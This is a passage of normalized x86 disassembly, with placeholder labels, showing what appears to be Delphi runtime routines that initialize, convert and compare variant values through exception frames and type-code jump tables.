pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4126c9
lea eax [ ebp - 0x10 ]
call sub_40ed58
retn
sub_4126d0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_412788
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_41426c
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41278f
lea eax [ ebp - 0x20 ]
call sub_4046e8
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41276b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_4047f8
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4048e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40ed58
retn
sub_412798
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_412cea
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_4127d2 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_404834
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_4046e8
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_408030
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_404834
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_408030
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404834
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_40942c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404834
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_40942c
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_404834
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_411d88
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404724
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_411dc0
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_404724
jmp r-xdata
push esi
lea eax [ ebp - 0x1c ]
mov edx [ ebx + 0x8 ]
call sub_4047f8
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4048e4
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ax [ ebx + 0x8 ]
call sub_411df8
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_404724
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_408030
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_404834
jmp r-xdata
lea edx [ ebp - 0x28 ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_408030
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_404834
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_408030
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_404834
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_40811c
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_404834
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_40811c
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_404834
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412798
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_4125b4
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_404724
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412cf1
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_404700
lea eax [ ebp - 0x6c ]
mov edx 0x5
call sub_40402c
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_404700
lea eax [ ebp - 0x4c ]
mov edx 0x4
call sub_40402c
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_404700
lea eax [ ebp - 0x34 ]
mov edx 0x5
call sub_40402c
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_404700
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_40402c
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_41266c
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_404724
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404834
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_40e520
test ah 0x40
je r-xdata
mov eax esi
call sub_4046e8
mov edx eax
mov eax ebx
call sub_4126d0
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_4125b4
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_404724
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_4125b4
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_404724
jmp r-xdata
jmp [ eax * 4 + jump_table_412a59 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408030
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_404834
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_408030
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_404834
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_40942c
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_404834
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_40942c
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_404834
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_411d88
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_404724
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_411dc0
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_404724
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4047f8
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_411df8
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_404724
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408030
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_404834
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408030
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_404834
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408030
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_404834
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_40811c
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_404834
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_40811c
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_404834
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412798
jmp r-xdata
sub_412cf8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412d62
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f080
lea eax [ ebp - 0x10 ]
call [ rw-data ]
cmp [ ebp - 0x10 ] 0xd
je r-xdata
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_40588c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412d69
lea eax [ ebp - 0x10 ]
call sub_40ed58
retn
mov dx 0xd
mov ax 0x101
call sub_40e520
sub_412d70
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
movzx eax [ ebx ]
cmp eax 0xd
jg r-xdata
sub eax 0x101
je r-xdata
je r-xdata
mov edx ebx
mov eax esi
call sub_412cf8
jmp r-xdata
sub eax 0x3f08
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_40588c
jmp r-xdata
sub eax 0x1
jb r-xdata
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_40588c
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax esi
call sub_405874
jmp r-xdata
je r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub eax 0x8
je r-xdata
mov edx esp
mov ax [ ebx ]
call sub_41426c
test al al
je r-xdata
mov eax esi
call sub_405874
jmp r-xdata
mov dx 0xd
mov ax 0x1
call sub_40e520
jmp r-xdata
mov ax [ ebx ]
mov dx 0xd
call sub_40e520
mov eax esi
call sub_405874
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_403344
test al al
jne r-xdata
sub_412e3c
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
mov ax [ ebx ]
sub ax 0x1
jb r-xdata
mov eax esi
call sub_405874
jmp r-xdata
je r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0x8
je r-xdata
mov eax esi
call sub_405874
jmp r-xdata
mov dx 0x9
mov ax 0x1
call sub_40e520
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_40588c
jmp r-xdata
sub ax 0x4000
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_40588c
jmp r-xdata
jmp r-xdata
mov edx esp
mov ax [ ebx ]
call sub_41426c
test al al
je r-xdata
mov ax [ ebx ]
mov dx 0x9
call sub_40e520
mov eax esi
call sub_405874
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_403344
test al al
jne r-xdata
sub_412ee8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_40ecdc
mov [ edi ] 0x3
movsx eax bl
mov ax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_412f24
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x3
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40ecdc
sub_412f44
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x11
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40ecdc
sub_412f64
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x12
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_40ecdc
sub_412f84
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x13
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40ecdc
sub_412fa4
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x10
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40ecdc
sub_412fc4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x2
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_40ecdc
sub_412fe4
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40ecdc
sub_413010
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x4
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_40ecdc
sub_413034
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x5
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40ecdc
sub_413060
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x6
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40ecdc
sub_41308c
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x7
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40ecdc
sub_4130b8
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_40ecdc
sub_41311c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_40405c
pop esi
pop ebx
retn
mov eax ebx
call sub_40ecdc
sub_413148
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_4048e4
pop esi
pop ebx
retn
mov eax ebx
call sub_40ecdc
sub_413180
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0xd
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_40588c
pop esi
pop ebx
retn
mov eax ebx
call sub_40ecdc
sub_4131ac
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x9
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_40588c
pop esi
pop ebx
retn
mov eax ebx
call sub_40ecdc
sub_4131d8
push ebx
mov ebx eax
and bx 0xfff
cmp bx 0x14
jbe r-xdata
mov eax ebx
pop ebx
retn
cmp bx 0x100
jne r-xdata
call sub_40e5bc
mov bx 0x8
jmp r-xdata
sub_4131fc
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4132bf
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x11 ]
call sub_40f080
cmp [ esi ] 0x101
jne r-xdata
cmp [ ebx ] 0x101
jne r-xdata
lea eax [ ebp - 0x11 ]
call [ rw-data ]
mov edx ebx
lea eax [ ebp - 0x11 ]
mov ecx edi
call sub_413ab0
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4132c6
lea eax [ ebp - 0x11 ]
call sub_40ed58
retn
lea eax [ ebp - 0x21 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413293
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x21 ]
call sub_40f080
lea eax [ ebp - 0x21 ]
call [ rw-data ]
lea edx [ ebp - 0x21 ]
lea eax [ ebp - 0x11 ]
mov ecx edi
call sub_413ab0
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x21 ]
call sub_40ed58
retn
sub_4132e4
push ebx
push ecx
mov [ esp ] dl
mov bl 0x1
mov edx ecx
sub edx 0xe
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
dec edx
je r-xdata
call sub_40e610
jmp r-xdata
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
dec edx
sub edx 0x4
jb r-xdata
mov eax ebx
pop edx
pop ebx
retn
mov bl [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
call sub_40e610
jmp r-xdata
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
jmp r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
mov bl [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
call sub_40e610
jmp r-xdata
je r-xdata
call sub_40e5bc
xor eax eax
jmp r-xdata
cmp [ esp ] 0x2
je r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
mov bl [ ecx * 2 + rw-data ]
jmp r-xdata
dec dl
je r-xdata
and eax 0x7f
mov bl [ eax + rw-data ]
jmp r-xdata
mov al 0x1
mov al 0x1
cmp [ esp ] 0x2
jne r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov bl 0x2
jmp r-xdata
cmp [ esp ] 0x2
jne r-xdata
and eax 0x7f
mov bl [ eax + rw-data ]
jmp r-xdata
xor ebx ebx
jmp r-xdata
mov bl 0x1
jmp r-xdata
sub_4133e0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
jle r-xdata
cmp eax [ ebp + 0x8 ]
jbe r-xdata
pop ebp
retn 0x10
mov al 0x1
mov al 0x2
jmp r-xdata
jmp r-xdata
sub_41341c
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_413444
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_41346c
push ebp
mov ebp esp
fild [ ebp + 0x10 ]
fild [ ebp + 0x8 ]
fcompp
fnstsw ax
sahf
jbe r-xdata
fild [ ebp + 0x10 ]
fild [ ebp + 0x8 ]
fcompp
fnstsw ax
sahf
jae r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_413498
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx edx
xor edx edx
push ebp
push sub_4134f3
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_412070
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_412070
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407dc0
xor edx edx
call sub_4133cc
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4134fa
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
sub_413504
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov ax [ esi ]
call sub_4131d8
movzx eax ax
mov bl [ eax + rw-data ]
mov ax [ edi ]
call sub_4131d8
movzx eax ax
mov al [ eax + rw-data ]
xor edx edx
mov dl al
xor ecx ecx
mov cl bl
imul ecx ecx 0xb
add ecx rw-data
movzx edx [ ecx + edx ]
cmp edx 0xa
ja r-xdata
call sub_40e5bc
mov al 0x1
jmp [ edx * 4 + jump_table_413555 ]
call sub_40e5bc
mov al 0x1
jmp r-xdata
mov edx eax
mov eax ebx
call sub_4132d0
jmp r-xdata
mov ecx ebp
mov edx eax
mov eax ebx
call sub_4132e4
jmp r-xdata
mov eax edi
call sub_40f710
push eax
mov eax esi
call sub_40f710
pop edx
call sub_4133cc
jmp r-xdata
mov eax esi
call sub_4101d4
push edx
push eax
mov eax edi
call sub_4101d4
push edx
push eax
call sub_4133e0
jmp r-xdata
mov eax esi
call sub_410ce4
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax edi
call sub_410ce4
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_41341c
jmp r-xdata
mov eax esi
call sub_411454
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax edi
call sub_411454
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_413444
jmp r-xdata
mov eax esi
call sub_4119bc
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax edi
call sub_4119bc
add esp 0xfffffff8
fistp [ esp ]
fwait
call sub_41346c
jmp r-xdata
mov edx edi
mov eax esi
call sub_413498
jmp r-xdata
mov eax edi
call sub_4107d0
and eax 0x7f
push eax
mov eax esi
call sub_4107d0
and eax 0x7f
pop edx
call sub_4133cc
jmp r-xdata
mov edx edi
mov eax esi
mov ecx ebp
call sub_4131fc
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_413690
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov [ ebp - 0x9 ] 0x1
mov si [ ebx ]
mov eax esi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
test ax ax
jne r-xdata
test si si
jne r-xdata
mov edx [ ebp - 0x4 ]
cmp ax 0x1
jne r-xdata
mov dl 0x1
xor eax eax
call sub_4132d0
mov [ ebp - 0x9 ] al
jmp r-xdata
cmp si 0x1
jne r-xdata
xor edx edx
mov al 0x1
call sub_4132d0
mov [ ebp - 0x9 ] al
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax esi
call sub_41426c
test al al
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x2
xor eax eax
call sub_4132e4
mov [ ebp - 0x9 ] al
jmp r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
call sub_41426c
test al al
jne r-xdata
mov ecx [ ebp - 0x8 ]
xor edx edx
mov al 0x2
call sub_4132e4
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
mov edx [ ebp - 0x4 ]
mov ecx 0xb
mov eax [ ebp - 0x14 ]
mov esi [ eax ]
call [ esi + 0x8 ]
test al al
je r-xdata
call sub_40e5bc
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
mov edx ebx
mov ecx 0xb
mov eax [ ebp - 0x18 ]
mov esi [ eax ]
call [ esi + 0x4 ]
test al al
je r-xdata
call sub_40e5bc
jmp r-xdata
mov esi [ ebp - 0x4 ]
mov si [ esi ]
mov eax esi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
cmp ax [ ebp - 0xe ]
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413829
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebx ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
call sub_40f34c
mov ax [ ebp - 0x28 ]
and ax 0xfff
cmp ax [ ebx ]
je r-xdata
mov ax [ ebx ]
cmp ax [ ebp - 0xc ]
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax esi
call sub_41426c
test al al
jne r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4139bb
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0x4 ]
movzx ecx [ ecx ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40f34c
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
cmp ax [ ebp - 0x28 ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413919
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xe ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
call sub_40f34c
mov ax [ ebp - 0x28 ]
cmp ax [ ebp - 0xe ]
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax ebx
mov ecx [ ebp - 0x8 ]
call sub_413504
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40ed58
retn
call sub_40e4cc
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41379b
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xc ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40f34c
mov ax [ ebp - 0x28 ]
and ax 0xfff
cmp ax [ ebp - 0xc ]
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov edx ebx
mov ecx 0xb
mov eax [ ebp - 0x18 ]
mov esi [ eax ]
call [ esi + 0x4 ]
test al al
je r-xdata
call sub_40e5bc
jmp r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x8 ]
call sub_413504
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40ed58
retn
call sub_40e4cc
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40ed58
retn
call sub_40e4cc
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x28 ]
